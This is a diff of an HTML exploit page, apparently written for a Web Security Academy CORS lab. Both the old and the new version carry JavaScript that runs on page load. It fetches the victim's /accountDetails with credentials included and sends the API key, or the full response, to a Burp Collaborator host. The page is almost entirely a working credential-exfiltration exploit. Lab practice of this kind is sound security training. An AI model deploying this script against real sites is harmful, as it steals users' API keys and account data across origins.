@@ -2,37 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leaking API Key</title>
-    <script>
-        window.onload = function() {
-            // Target URL to fetch the API key
-            const targetUrl = 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails';
-            const burpCollabServer = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com';
-
-            fetch(targetUrl)
-                .then(response => response.text())
-                .then(data => {
-                    // Extract the API key from the response data
-                    const apikey = extractApiKey(data);
-                    if (apikey) {
-                        // Send the API key to the Burp Collaborator server
-                        fetch(`${burpCollabServer}/?apikey=${apikey}`);
-                    }
-                })
-                .catch(error => console.error('Error fetching the API key:', error));
-        };
-
-        function extractApiKey(responseData) {
-            // Regular expression to find the API key in the response data
-            const apiKeyPattern = /apikey=([a-zA-Z0-9]+)/;
-            const match = responseData.match(apiKeyPattern);
-            return match ? match[1] : null;
-        }
-    </script>
+    <title>Exploit Page</title>
 </head>
 <body>
-    <h1>Leaking API Key</h1>
-    <p>If you are seeing this page, the API key has been leaked.</p>
+    <h1>Loading...</h1>
+    <script>
+        // The target URL to fetch data from
+        const targetUrl = 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails';
+
+        // Function to send data to your Burp Collaborator server
+        function sendToBurpCollaborator(data) {
+            const collaboratorUrl = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com';
+            fetch(`${collaboratorUrl}/?data=${encodeURIComponent(data)}`);
+        }
+
+        // Function to fetch data from the target and send it to Burp Collaborator server
+        function fetchAndExfiltrateData() {
+            fetch(targetUrl, {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.text())
+            .then(data => {
+                sendToBurpCollaborator(data);
+            })
+            .catch(error => console.error('Error fetching data:', error));
+        }
+
+        // Trigger the data exfiltration
+        fetchAndExfiltrateData();
+    </script>
 </body>
 </html>
